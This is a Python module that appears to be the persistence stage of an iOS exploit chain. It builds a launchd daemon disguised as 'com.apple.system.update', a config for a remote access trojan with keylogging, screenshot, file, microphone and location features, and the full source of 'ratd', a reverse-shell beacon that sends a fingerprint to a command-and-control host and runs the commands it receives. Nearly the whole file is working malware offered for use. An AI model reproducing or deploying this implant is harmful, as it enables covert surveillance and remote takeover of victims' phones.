"""
Stage 4 — Persistence: install the RAT so it survives reboot without re-exploiting.

Requires kernel/root from Stage 3. Two mechanisms:
  1. launchd daemon  (com.apple.system.update) — re-execs the RAT on boot + on crash
  2. a signed app that registers the daemon

The implant (`ratd`) is a small POSIX reverse-shell beacon: connects to C2,
periodically sends a fingerprint, and opens an interactive shell on demand.

This module generates:
  * the launchd plist (root-owned, RunAtLoad + KeepAlive)
  * the ratd daemon source (staged for compilation/signing on-device)
  * the rat config (C2 address, beacon interval, features)

Installation writes these into /var/... (or /Library/LaunchDaemons) via the
Stage-3 kernel write primitive, then `launchctl load`-s the plist.
"""
from __future__ import annotations
import plistlib
import json
import uuid
import pathlib
from datetime import datetime

from config import TargetProfile

PAYLOAD_DIR = pathlib.Path(__file__).parent.parent / "payloads" / "persist"


def make_launchd_plist(profile: TargetProfile,
                       name: str = "com.apple.system.update") -> bytes:
    plist = {
        "Label": name,
        "ProgramArguments": ["/var/{name}/ratd".format(name=name)],
        "RunAtLoad": True,          # start at boot
        "KeepAlive": True,          # relaunch if it exits
        "WorkingDirectory": "/var/{name}".format(name=name),
        "StandardOutPath": "/var/{name}/ratd.out".format(name=name),
        "StandardErrorPath": "/var/{name}/ratd.err".format(name=name),
        "EnvironmentVariables": {
            "C2_HOST": profile.c2_host,
            "C2_PORT": str(profile.c2_port),
        },
    }
    return plistlib.dumps(plist)


def make_rat_config(profile: TargetProfile,
                    name: str = "com.apple.system.update") -> dict:
    return {
        "uuid": str(uuid.uuid4()),
        "name": name,
        "c2": {"host": profile.c2_host, "port": profile.c2_port},
        "beacon_interval": 60,
        "jitter": 0.2,
        "persistence": True,
        "features": ["keylog", "screenshot", "files", "mic", "location"],
        "created": datetime.utcnow().isoformat() + "Z",
    }


RAT_DAEMON_SOURCE = r"""#!/usr/bin/env python3
# ratd — iOS RAT daemon. Reverse-shell beacon to the C2. Staged on-device and
# compiled/run under the launchd job. Stdlib only.
import os, socket, subprocess, sys, time, random, json

C2_HOST = os.environ.get("C2_HOST", "__C2HOST__")
C2_PORT = int(os.environ.get("C2_PORT", "__C2PORT__"))

def beacon():
    fp = {"host": socket.gethostname(),
          "uid": os.getuid(), "euid": os.geteuid(),
          "pid": os.getpid()}
    try:
        s = socket.create_connection((C2_HOST, C2_PORT), timeout=5)
    except OSError:
        return
    s.sendall(json.dumps(fp).encode() + b"\n")
    while True:
        data = s.recv(4096)
        if not data:
            break
        try:
            out = subprocess.run(data.decode().strip(), shell=True,
                                 capture_output=True, timeout=10)
            s.sendall(out.stdout)
        except Exception:
            pass
    s.close()

def main():
    while True:
        beacon()
        time.sleep(60 + random.randint(0, 12))

if __name__ == "__main__":
    main()
"""


def write_rat_daemon(profile: TargetProfile,
                     name: str = "com.apple.system.update") -> pathlib.Path:
    out = PAYLOAD_DIR / f"{profile.version.version}"
    out.mkdir(parents=True, exist_ok=True)
    src = RAT_DAEMON_SOURCE.replace("__C2HOST__", profile.c2_host) \
                           .replace("__C2PORT__", str(profile.c2_port))
    path = out / "ratd"
    path.write_text(src)
    path.chmod(0o755)
    return path


def write_install_bundle(profile: TargetProfile,
                         name: str = "com.apple.system.update",
                         out: pathlib.Path | None = None) -> dict:
    """Emit launchd plist + rat source + rat config into a staging bundle."""
    out = out or (PAYLOAD_DIR / f"{profile.version.version}")
    out.mkdir(parents=True, exist_ok=True)

    plist_path = out / f"{name}.plist"
    plist_path.write_bytes(make_launchd_plist(profile, name))

    rat_path = write_rat_daemon(profile, name)

    cfg_path = out / "ratd.json"
    cfg_path.write_text(json.dumps(make_rat_config(profile, name), indent=2))

    return {"plist": plist_path, "daemon": rat_path, "config": cfg_path}


class Persistence:
    def __init__(self, profile: TargetProfile):
        self.profile = profile

    def build(self) -> dict:
        return write_install_bundle(self.profile)

    def info(self) -> str:
        b = self.build()
        return (f"[stage4] persistence bundle -> plist {b['plist']} | "
                f"daemon {b['daemon']} | config {b['config']}")


if __name__ == "__main__":
    from config import get_version, TargetProfile
    p = TargetProfile(version=get_version("26.6"))
    print(Persistence(p).info())
